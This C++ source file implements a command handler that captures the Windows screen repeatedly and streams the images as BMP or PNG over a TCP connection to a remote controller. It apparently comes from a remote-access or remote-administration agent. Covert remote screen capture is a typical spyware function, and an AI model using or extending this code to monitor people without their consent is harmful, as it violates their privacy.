#include "command/execute/ScreenshotExecuter.h"

#include <windows.h>

#ifdef _DEBUG
#include <iostream>
#include <fstream>
#endif // _DEBUG

#include "networking/interfaces/ITCPClient.h"
#include "methods/screenshot/BmpScreenshot.h"
#include "methods/screenshot/PNGEncoder.h"


using namespace command;

bool
ScreenshotExecuter::Execute(
    char const *byte_array,
    uint32_t length,
    networking::ITCPClient& connection)
noexcept
{

    if ( length != sizeof(s_Translation) )
        return ( false );

    return ( ExecuteTranslatedByteArray((s_Translation*)byte_array, connection) );
}

/* protected */

bool
ScreenshotExecuter::ExecuteTranslatedByteArray(
    s_Translation *byte_array,
    networking::ITCPClient& connection)
{
    while ( byte_array->captures-- > 0 )
    {
        if ( true == CaptureAndSend(byte_array, connection) )
        {
            connection.Send("o.k", 3);
        }
        else
        {
            connection.Send("err", 3);
        }

        Sleep(byte_array->wait_milliseconds);
    }

//    connection.Send("end", 3);

    return ( 0 == byte_array->captures );
}

bool
ScreenshotExecuter::CaptureAndSend(
    s_Translation *byte_array,
    networking::ITCPClient& connection)
{
    methods::screenshot::BmpScreenshot screenshot(byte_array->bits_per_pixel);

    if ( byte_array->png )
        return ( SendAsPNG(screenshot, connection) );

    return ( SendAsBMP(screenshot, connection) );
}

bool
ScreenshotExecuter::SendAsBMP(
    methods::screenshot::BmpScreenshot& screenshot,
    networking::ITCPClient& connection)
{
    size_t size;
    char const *ptr;

    ptr = (char const*)screenshot.GetFileHeader(&size);
    if ( size != (size_t)connection.Send(ptr, size) )
        return ( false );

    ptr = (char const*)screenshot.GetBMIHeader(&size);
    if ( size != (size_t)connection.Send(ptr, size) )
        return ( false );

    ptr = (char const*)screenshot.GetPixelData(&size);
    if ( size != (size_t)connection.Send(ptr, size) )
        return ( false );

    return ( true );
}

bool
ScreenshotExecuter::SendAsPNG(
    methods::screenshot::BmpScreenshot& screenshot,
    networking::ITCPClient& connection)
{
    methods::screenshot::PNGEncoder png_screenshot(screenshot);

    size_t size;
    unsigned char const *ptr;

    ptr = png_screenshot.GetData(&size);

    return ( 0 != size && size == (size_t)connection.Send((char const*)ptr, size) );
}
